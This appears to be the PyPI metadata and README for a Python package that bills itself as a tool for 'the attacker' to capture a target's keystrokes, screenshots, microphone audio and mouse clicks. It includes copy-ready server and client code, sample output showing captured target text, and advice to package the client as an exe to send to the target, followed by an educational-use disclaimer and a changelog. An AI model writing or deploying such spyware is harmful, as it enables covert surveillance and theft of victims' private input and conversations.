Metadata-Version: 2.1
Name: KeyloggerScreenshot
Version: 0.2.3.1
Summary: Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot
Home-page: 
Author: Fawaz Bashiru
Author-email: fawazbashiru@gmail.com
License: MIT
Keywords: KeyloggerScreenshot
Classifier: Development Status :: 6 - Mature
Classifier: Intended Audience :: Education
Classifier: Operating System :: Microsoft :: Windows :: Windows 10
Classifier: License :: OSI Approved :: MIT License
Classifier: Programming Language :: Python :: 3
Description-Content-Type: text/markdown

KeyloggerScreenshot
====================

Created by: Fawaz Bashiru

KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Every mouse click will be stored in a text file. Follow the instructions to build your own server in "KeyloggerScreenshot"

Check out my github for the more easier way: https://github.com/Facileee/KeyloggerScreenshot

![kali_img](https://user-images.githubusercontent.com/106278241/206914635-c9d5e505-9499-4dce-91ed-5254f495929d.png)

To install KeyloggerScreenshot simply type:
`pip install KeyloggerScreenshot `
In your terminal

SHOUT OUT TO:
-------------
name: dyma020

link to his insta: https://www.instagram.com/dyma020/

He had the idea of the mouse information. He also build the graphical user interface. Big thanks to him

HOW DOES KeyloggerScreenshot WORK?
----------------------------------
* This module can be used in Windows and Linux

* The servers can now be run in the same file with the module threading

* The port number for each server should be different

* The server should obviously be run before the client

* You can just copy the following code and insert you ip-address in the variable "ip"

* You can find your ip-address in the command line by using the command "ipconfig"

FOR EXAMPLE:
============

Servers:
---------

#EveryServer.py:
```python
import KeyloggerScreenshot as ks
import threading

ip = "127.0.0.1" #Your IP-Adress

ip_photos, port_photos = ip, 1111
server_photos = ks.ServerPhotos(ip_photos, port_photos)

ip_keylogger, port_keylogger = ip, 2222
server_keylogger = ks.ServerKeylogger(ip_keylogger, port_keylogger)#You can set the parameter "simulator" to True to show the simulation where the target has typed something

ip_listener, port_listener = ip, 3333
server_listener = ks.ServerListener(ip_listener, port_listener)

ip_time, port_time = ip, 4444
server_time = ks.Timer(ip_time, port_time)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start()
```


Clients:
---------
```python
#client_target.py
import KeyloggerScreenshot as ks

ip = '127.0.0.1'
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60)
key_client.start()
```

```text
Output

Cyan: ServerPhotos
Blue: ServerKeylogger
Green: ServerListener
White: Timer

Waiting for connection....Waiting for connection...
Waiting for connection...

Connection has been established with the ip 127.0.0.1
Time left: 02:59

Connection has been established with ('127.0.0.1', 63822)
Time left: 00:01Connection has been established with ('127.0.0.1', 63842)

Successful connection for 3 minutes and 20 seconds
"Audio of target.wav" has been saved to your directory
Connection has been established with ('127.0.0.1', 63843)
Text of target: Hello this is a test 123. 123 Nice it works have fun  guys
1 Image have been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63824)
2 Images has been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63825)
3 Images has been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63829)
4 Images has been saved to your working directory
Waiting for connection...


Connection has been established with ('127.0.0.1', 63841)
5 Images has been saved to your working directory
Waiting for connection...
```

Additional

* You can send "client_target.py" as an exe file to the target with "auto-py-to-exe"

* KeyloggerScreenshot is very easy to use.

* The servers can be used on any OS. The client should be a Windows OS

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.


Change Log
==========

0.0.1 (14/10/2022)
-----------------
- First Release

0.0.2 (15/10/2022)
-----------------
- Bug Fixes

0.0.3 (15/10/2022)
-----------------
- Bug Fixes

0.0.4 (17/10/2022)
-----------------
- New features (Audio Recorder from target, All Servers in one file)
- Bug Fixes
- Detailed review of the code

0.0.5 (18/10/2022)
-----------------
- Better audio connection
- Bug Fixes

0.0.6 (19/10/2022)
-----------------
- New Timer Class
- Better Output on Terminal
- More efficient connection
- More Ports and IP's

0.0.6.1 (19/10/2022)
------------------
- Bug Fixes

0.0.7 (24/10/2022)
-----------------
- Better Description

0.1.0 (30/10/2022)
-----------------
- Bug Fixes
- pyscreeze Error fixed
- Keyboard Interruption (server will be destroyed after Keyboard Interruption from the user)
- Keylogger data even after Keyboard Interruption
- Much better Audio connection
- Better Audio Files

0.1.1 (30/10/2022)
------------------
- Image fix on website

0.1.2 (07/11/2022)
------------------
- Bug Fixes
- Big Update 12.11.2022

0.2.2 (04/02/2023)
-----------------
- Audio of target got fixed
- Mouse log in fixed
- All Mouse Logs will be saved in "mouseLogInfo.txt"
- new function called "check_double" which detects if there are more files

0.2.4 (10/02/2023)
------------------
- New Graphical User Interface (GUI)
- New simulation feature (only on linux)
- Capslock detection
- Better documentation
